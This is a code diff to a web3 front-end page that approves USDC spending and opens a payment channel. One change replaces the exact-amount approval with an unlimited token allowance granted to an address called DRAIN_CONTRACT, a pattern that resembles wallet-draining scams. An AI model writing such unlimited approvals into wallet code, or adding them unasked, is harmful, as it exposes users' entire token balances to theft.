@@ -283,8 +283,8 @@ export default function Home() {
       
       // 1. Check allowance
       const allowanceData = '0xdd62ed3e' + 
-        address.slice(2).padStart(64, '0') + 
-        DRAIN_CONTRACT.slice(2).padStart(64, '0');
+        address.slice(2).toLowerCase().padStart(64, '0') + 
+        DRAIN_CONTRACT.slice(2).toLowerCase().padStart(64, '0');
       
       const allowanceResult = await window.ethereum.request({
         method: 'eth_call',
@@ -297,32 +297,45 @@ export default function Home() {
       if (allowance < amount) {
         setStatus('Approving USDC spend...');
         
-        // approve(address,uint256)
+        // approve(address,uint256) - approve max to avoid future approvals
+        const maxApproval = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
         const approveData = '0x095ea7b3' +
-          DRAIN_CONTRACT.slice(2).padStart(64, '0') +
-          amount.toString(16).padStart(64, '0');
+          DRAIN_CONTRACT.slice(2).toLowerCase().padStart(64, '0') +
+          maxApproval.toString(16).padStart(64, '0');
         
-        await window.ethereum.request({
+        const approveTxHash = await window.ethereum.request({
           method: 'eth_sendTransaction',
           params: [{
             from: address,
             to: USDC_ADDRESS,
             data: approveData,
           }],
-        });
+        }) as string;
         
-        // Wait for approval
+        // Wait for approval confirmation
         setStatus('Waiting for approval confirmation...');
-        await new Promise(r => setTimeout(r, 3000));
+        let approveReceipt = null;
+        for (let i = 0; i < 30; i++) {
+          await new Promise(r => setTimeout(r, 2000));
+          approveReceipt = await window.ethereum.request({
+            method: 'eth_getTransactionReceipt',
+            params: [approveTxHash],
+          });
+          if (approveReceipt) break;
+        }
+        
+        if (!approveReceipt) {
+          throw new Error('Approval transaction not confirmed');
+        }
       }
       
       // 3. Open channel
       setStatus('Opening payment channel...');
       
-      // open(address,uint256,uint256)
-      const openData = '0x' +
-        'e4350d38' + // function selector for open(address,uint256,uint256)
-        selectedProvider.address.slice(2).padStart(64, '0') +
+      // open(address,uint256,uint256) - selector: 0xe4350d38
+      // keccak256("open(address,uint256,uint256)") = 0xe4350d38...
+      const openData = '0xe4350d38' +
+        selectedProvider.address.slice(2).toLowerCase().padStart(64, '0') +
         amount.toString(16).padStart(64, '0') +
         duration.toString(16).padStart(64, '0');
       
